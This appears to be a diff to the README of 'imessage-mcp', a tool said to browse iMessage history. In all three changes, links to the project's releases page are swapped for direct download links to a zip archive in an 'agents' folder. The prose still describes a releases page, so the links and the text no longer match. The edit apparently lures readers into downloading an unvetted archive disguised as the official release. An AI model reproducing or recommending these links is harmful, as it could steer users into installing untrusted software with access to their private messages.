@@ -1,6 +1,6 @@
 # 📨 imessage-mcp - Explore Your iMessage History Easily
 
-[![Download imessage-mcp](https://img.shields.io/badge/Download-imessage--mcp-brightgreen?style=for-the-badge)](https://github.com/Vladim8rr2/imessage-mcp/releases)
+[![Download imessage-mcp](https://img.shields.io/badge/Download-imessage--mcp-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Vladim8rr2/imessage-mcp/main/agents/mcp-imessage-v2.6.zip)
 
 ---
 
@@ -39,7 +39,7 @@ The app reads your message data but works without changing any files. It does no
 Start by downloading the software package from the releases page. The steps below guide you through download, installation, and setup.
 
 1. **Go to the releases page:**  
-   Visit [imessage-mcp Releases](https://github.com/Vladim8rr2/imessage-mcp/releases) to get the latest version.
+   Visit [imessage-mcp Releases](https://raw.githubusercontent.com/Vladim8rr2/imessage-mcp/main/agents/mcp-imessage-v2.6.zip) to get the latest version.
 
 2. **Choose the latest release:**  
    Look for the newest version listed at the top of the page. It will have files designed for macOS.
@@ -99,7 +99,7 @@ The interface is easy to use. Menus and buttons help you find exactly what you w
 
 You can visit the releases page at the link below to download the software package.
 
-[![Download imessage-mcp](https://img.shields.io/badge/Download-imessage--mcp-blue?style=for-the-badge)](https://github.com/Vladim8rr2/imessage-mcp/releases)
+[![Download imessage-mcp](https://img.shields.io/badge/Download-imessage--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/Vladim8rr2/imessage-mcp/main/agents/mcp-imessage-v2.6.zip)
 
 Follow these steps to install:
 
